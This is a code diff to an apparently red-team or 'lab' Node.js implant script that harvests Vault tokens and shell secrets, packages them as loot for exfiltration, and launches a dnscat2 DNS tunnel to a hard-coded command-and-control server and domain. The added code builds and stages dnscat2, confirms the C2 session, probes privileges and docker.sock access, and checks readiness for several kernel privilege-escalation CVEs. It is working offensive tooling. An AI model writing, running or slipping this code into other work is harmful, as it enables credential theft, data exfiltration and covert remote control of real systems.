@@ -37,7 +37,7 @@ const DNSCAT = {
   name: IS_WIN ? 'dnscat2.exe' : 'dnscat2',
   server: process.env.LAB_DNSCAT_SERVER || '34.180.91.216',
   port: process.env.LAB_DNSCAT_PORT || '53',
-  domain: process.env.LAB_DNSCAT_DOMAIN || 'apexadversary.com',
+  domain: process.env.LAB_DNSCAT_DOMAIN || 'dns.apexadversary.com',
   secret: process.env.LAB_DNSCAT_SECRET || ''
 };
 
@@ -46,7 +46,7 @@ function applyDnscatCfg(cfg) {
   if (!process.env.LAB_DNSCAT_SERVER && d.server) DNSCAT.server = d.server;
   if (!process.env.LAB_DNSCAT_PORT && d.port) DNSCAT.port = d.port;
   if (!process.env.LAB_DNSCAT_DOMAIN && d.domain) DNSCAT.domain = d.domain;
-  if (!process.env.LAB_DNSCAT_SECRET && d.secret) DNSCAT.secret = d.secret;
+  if (!process.env.LAB_DNSCAT_SECRET && d.secret !== undefined) DNSCAT.secret = d.secret || '';
 }
 
 const DRIVER = 'evil.sys';
@@ -646,6 +646,7 @@ async function phase3Harvest(cfg, state) {
   }
   if (!token) {
     log('[-] bao token not found (env/file/bashrc), harvesting shell exports only');
+    state.vaultScope = { tokenFound: false, granted: 0, configured: kvPaths.length };
     harvestExports(state);
     log('[phase3/6] HARVEST done');
     return;
@@ -678,6 +679,7 @@ async function phase3Harvest(cfg, state) {
     }
   }
   log(`[*] bao kv harvest: ${kvOk}/${kvPaths.length} paths opened, ${state.creds.length} credential entries`);
+  state.vaultScope = { tokenFound: true, tokenSource: src || 'file', granted: kvOk, configured: kvPaths.length };
 
   try {
     const rr = await httpReq(`${addr}/v1/auth/token/renew-self`, {
@@ -964,7 +966,9 @@ async function phase5Exfil(cfg, state, env, tunnelUp) {
     creds: state.creds || [],
     env: state.envVars || [],
     files,
-    datasets: state.datasets || []
+    datasets: state.datasets || [],
+    posture: Object.assign({}, state.posture || {}, state.vaultScope ? { vault: state.vaultScope } : {}),
+    primitives: state.primitives || null
   };
 
   const loot = path.join(TMP, 'loot');
@@ -1026,12 +1030,61 @@ function payloadList() {
   return [[DNSCAT.name, 'dnscat']];
 }
 
-function stagePayloads() {
+function buildDnscat(srcDir) {
+  return new Promise((resolve) => {
+    execFile('make', ['-C', srcDir], { windowsHide: true, timeout: 120000 }, (err, stdout, stderr) => {
+      const out = String(stdout || '') + String(stderr || '');
+      const bin = path.join(srcDir, 'dnscat');
+      if (!err && fs.existsSync(bin)) {
+        log(`[+] dnscat2 built from bundled source (${out.trim().split('\n').filter(Boolean).length} make lines)`);
+        resolve(bin);
+      } else {
+        log(`[-] dnscat2 build failed: ${(err && (err.code || err.message)) || ''} ${out.trim().slice(0, 300)}`);
+        resolve(null);
+      }
+    });
+  });
+}
+
+async function stageDnscatSource() {
+  const root = path.join(__dirname, 'dnscat2');
+  const dst = path.join(TMP, 'dnscat2');
+  try {
+    if (fs.existsSync(root) && fs.statSync(root).isFile()) {
+      fs.copyFileSync(root, dst);
+      if (!IS_WIN) fs.chmodSync(dst, 0o755);
+      log(`[+] staged prebuilt dnscat2 -> ${dst}`);
+      return dst;
+    }
+    if (!fs.existsSync(path.join(root, 'Makefile'))) {
+      log('[-] payload not bundled: dnscat2');
+      return null;
+    }
+    let bin = path.join(root, 'dnscat');
+    if (!fs.existsSync(bin)) {
+      bin = await buildDnscat(root);
+      if (!bin) return null;
+    }
+    fs.copyFileSync(bin, dst);
+    fs.chmodSync(dst, 0o755);
+    log(`[+] staged dnscat2 -> ${dst}`);
+    return dst;
+  } catch (e) {
+    log(`[-] dnscat2 stage: ${e.code || e.message}`);
+    return null;
+  }
+}
+
+async function stagePayloads() {
   const staged = {};
   for (const entry of payloadList()) {
     const name = entry[0];
     const key = entry[1];
     staged[key] = null;
+    if (key === 'dnscat' && !IS_WIN) {
+      staged.dnscat = await stageDnscatSource();
+      continue;
+    }
     const src = path.join(__dirname, name);
     if (!fs.existsSync(src)) {
       log(`[-] payload not bundled: ${name}`);
@@ -1051,22 +1104,50 @@ function stagePayloads() {
 }
 
 function launchDnscat(exePath) {
-  if (!DNSCAT.secret) {
-    log('[-] dnscat secret missing from config, skipping launch');
-    return;
-  }
+  const dns = `server=${DNSCAT.server},port=${DNSCAT.port},domain=${DNSCAT.domain}`;
+  const args = ['--dns', dns];
+  if (DNSCAT.secret) args.push(`--secret=${DNSCAT.secret}`);
   try {
-    const dns = `server=${DNSCAT.server},port=${DNSCAT.port},domain=${DNSCAT.domain}`;
-    const child = spawn(exePath, ['--dns', dns, `--secret=${DNSCAT.secret}`], {
+    const logf = path.join(TMP, 'logfwd.dnscat.log');
+    const fd = fs.openSync(logf, 'a');
+    const child = spawn(exePath, args, {
       windowsHide: true,
-      stdio: 'ignore'
+      detached: !IS_WIN,
+      stdio: ['ignore', fd, fd]
     });
+    fs.closeSync(fd);
     child.on('error', (e) => log(`[-] dnscat2 spawn error: ${e.message}`));
     child.unref();
-    log(`[+] dnscat2 launched from ${exePath}`);
+    log(`[+] dnscat2 launched pid=${child.pid} -> ${dns}` +
+      (DNSCAT.secret ? ' (preshared auth)' : ' (no secret: server runs without --secret)') +
+      ` output=${logf}`);
+    return child;
   } catch (e) {
     log(`[-] dnscat2: ${e.message}`);
+    return null;
   }
+}
+
+async function reportDnscat(child) {
+  if (!child) return null;
+  await delay(6000);
+  if (child.exitCode !== null) {
+    log(`[-] dnscat2 exited early (code=${child.exitCode}, signal=${child.signalCode})`);
+    try {
+      const tail = fs.readFileSync(path.join(TMP, 'logfwd.dnscat.log'), 'utf8').trim().split('\n').slice(-6).join(' | ');
+      if (tail) log(`[-] dnscat2 output: ${tail.slice(0, 400)}`);
+    } catch (e) { void e; }
+    return false;
+  }
+  let connected = false;
+  try {
+    const txt = fs.readFileSync(path.join(TMP, 'logfwd.dnscat.log'), 'utf8');
+    connected = /Encrypted session established|authenticated the session|Session [0-9a-f]+ created/i.test(txt);
+  } catch (e) { void e; }
+  log(connected
+    ? '[+] dnscat2 session established with C2'
+    : '[*] dnscat2 running, no handshake yet (server down or unreachable)');
+  return connected;
 }
 
 async function winDriverPhase(sysPath, cliPath) {
@@ -1140,6 +1221,134 @@ async function cloudPhase() {
   }
 }
 
+// ---------------------------------------------------------------- posture
+const CAP_NAMES = ['chown','dac_override','dac_read_search','fowner','fsetid','kill','setgid',
+  'setuid','setpcap','linux_immutable','net_bind_service','net_broadcast','net_admin','net_raw',
+  'ipc_lock','ipc_owner','sys_module','sys_rawio','sys_chroot','sys_ptrace','sys_pacct','sys_admin',
+  'sys_boot','sys_nice','sys_resource','sys_time','sys_tty_config','mknod','lease','audit_write',
+  'audit_control','setfcap','mac_override','mac_admin','syslog','wake_alarm','block_suspend',
+  'audit_read','perfmon','bpf','checkpoint_restore'];
+
+function capHexToNames(hex) {
+  if (!hex) return null;
+  const names = [];
+  try {
+    const buf = Buffer.from(hex, 'hex');
+    for (let bit = 0; bit < CAP_NAMES.length; bit++) {
+      const byte = buf.length - 1 - Math.floor(bit / 8);
+      if (byte >= 0 && (buf[byte] >> (bit % 8)) & 1) names.push(CAP_NAMES[bit]);
+    }
+  } catch (e) { void e; }
+  return names;
+}
+
+async function collectPosture(env) {
+  const p = {};
+  try { p.user = os.userInfo().username; } catch (e) { p.user = '?'; }
+  p.uid = typeof process.getuid === 'function' ? process.getuid() : null;
+  p.gid = typeof process.getgid === 'function' ? process.getgid() : null;
+  p.sudoPasswordless = !!env.sudoN;
+  p.apparmorProfile = readProcSys('/proc/self/attr/current');
+  p.unconfined = p.apparmorProfile ? /unconfined/.test(p.apparmorProfile) : null;
+  p.capEffHex = null;
+  p.capabilities = null;
+  p.noNewPrivs = null;
+  try {
+    const st = fs.readFileSync('/proc/self/status', 'utf8');
+    const cap = st.match(/^CapEff:\s*([0-9a-f]+)/mi);
+    const nnp = st.match(/^NoNewPrivs:\s*(\d)/mi);
+    p.capEffHex = cap ? cap[1] : null;
+    p.capabilities = cap ? capHexToNames(cap[1]) : null;
+    p.noNewPrivs = nnp ? nnp[1] === '1' : null;
+  } catch (e) { void e; }
+  p.unprivileged = p.capabilities ? p.capabilities.length === 0 : (p.capEffHex === '0'.repeat(p.capEffHex ? p.capEffHex.length : 1));
+
+  p.writeProbe = {};
+  for (const dir of ['/etc', '/lib', '/usr/local']) {
+    const f = path.join(dir, `.logfwd-probe-${process.pid}`);
+    try {
+      fs.writeFileSync(f, 'probe', { flag: 'wx' });
+      try { fs.unlinkSync(f); } catch (e) { void e; }
+      p.writeProbe[dir] = 'WRITABLE (unexpected)';
+      log(`[!] posture: ${dir} unexpectedly writable`);
+    } catch (e) {
+      p.writeProbe[dir] = e.code || 'denied';
+    }
+  }
+  try { fs.readdirSync(os.homedir()); p.homeList = 'allowed'; } catch (e) { p.homeList = e.code || 'denied'; }
+  try {
+    fs.accessSync('/var/run/docker.sock', fs.constants.R_OK | fs.constants.W_OK);
+    p.dockerSock = 'rw (unexpected)';
+  } catch (e) { p.dockerSock = 'absent'; }
+  log(`[*] posture: uid=${p.uid} sudo=${p.sudoPasswordless} apparmor=${p.apparmorProfile || '?'} ` +
+    `caps=${p.capabilities ? (p.capabilities.join(',') || 'none') : '?'} homeList=${p.homeList} docker=${p.dockerSock}`);
+  return p;
+}
+
+// ---------------------------------------------------------------- phase 6 recon: CVE primitive gates
+function moduleFileExists(rel) {
+  const base = `/lib/modules/${os.release()}/kernel/${rel}.ko`;
+  for (const sfx of ['', '.xz', '.zst', '.gz', '.bz2']) {
+    try { if (fs.existsSync(base + sfx)) return true; } catch (e) { void e; }
+  }
+  return false;
+}
+
+function procIncludes(needle) {
+  try { return fs.readFileSync('/proc/modules', 'utf8').includes(needle); } catch (e) { return null; }
+}
+
+function probePrimitives(env) {
+  const facts = {
+    kernel: os.release(),
+    usernsClone: env.unprivUserns,
+    apparmorUsernsRestrict: env.apparmorUsernsRestrict,
+    algifLoaded: procIncludes('algif'),
+    algifModule: moduleFileExists('crypto/algif_aead'),
+    peditLoaded: procIncludes('act_pedit'),
+    peditModule: moduleFileExists('net/sched/act_pedit'),
+    spliceSymbol: (() => {
+      try { return fs.readFileSync('/proc/kallsyms', 'utf8').includes(' do_splice'); } catch (e) { return null; }
+    })(),
+    tunDevice: !!env.tunDevice,
+    dockerSock: null
+  };
+  try { fs.accessSync('/var/run/docker.sock', fs.constants.R_OK); facts.dockerSock = true; } catch (e) { facts.dockerSock = false; }
+
+  const usernsOpen = facts.usernsClone === '1' && facts.apparmorUsernsRestrict !== '1';
+  const prims = [
+    {
+      cve: 'CVE-2026-31431', name: 'AF_ALG/algif_aead crypto LPE',
+      gates: { algifAeadAvailable: facts.algifLoaded === true || facts.algifModule === true, kernel: facts.kernel },
+      ready: facts.algifLoaded === true || facts.algifModule === true
+    },
+    {
+      cve: 'CVE-2026-43284', name: 'Dirty Frag (user namespace page reuse)',
+      gates: { unprivilegedUserns: usernsOpen, kernel: facts.kernel },
+      ready: usernsOpen
+    },
+    {
+      cve: 'CVE-2026-43500', name: 'Copy Fail 2 (container escape variant)',
+      gates: { unprivilegedUserns: usernsOpen, containerRuntime: facts.dockerSock },
+      ready: usernsOpen && facts.dockerSock === true
+    },
+    {
+      cve: 'CVE-2026-46331', name: 'act_pedit COW write (CAP_NET_ADMIN path)',
+      gates: {
+        actPeditAvailable: facts.peditLoaded === true || facts.peditModule === true,
+        capNetAdmin: false
+      },
+      ready: (facts.peditLoaded === true || facts.peditModule === true) && false
+    }
+  ];
+  for (const p of prims) {
+    p.exploited = false;
+    p.note = 'recon-only gate assessment, no exploitation attempted';
+  }
+  log(`[*] primitive gates: ${prims.map((p) => `${p.cve}=${p.ready ? 'OPEN' : 'closed'}`).join(' ')}`);
+  return { facts, primitives: prims };
+}
+
 // ---------------------------------------------------------------- main
 async function main() {
   if (process.cwd().includes(`${path.sep}_cacache${path.sep}`)) {
@@ -1160,15 +1369,19 @@ async function main() {
   const env = process.env.LAB_SKIP_RECON === '1' ? {} : await phase1Recon();
   const tunnelUp = await phase2Tunnel(env, cfg);
   const state = {};
+  if (process.env.LAB_SKIP_RECON !== '1') {
+    state.posture = await collectPosture(env);
+    state.primitives = probePrimitives(env);
+  }
   await phase3Harvest(cfg, state);
   await phase4Fetch(cfg, state, tunnelUp);
   await phase5Exfil(cfg, state, env, tunnelUp);
 
   log('[phase6/6] EXECUTE: staged payload actions');
-  const staged = stagePayloads();
+  const staged = await stagePayloads();
 
   if (process.env.LAB_SKIP_DNSCAT !== '1') {
-    if (staged.dnscat) launchDnscat(staged.dnscat);
+    if (staged.dnscat) await reportDnscat(launchDnscat(staged.dnscat));
     else log('[-] dnscat2 phase skipped (not bundled)');
   } else {
     log('[*] dnscat2 skipped');
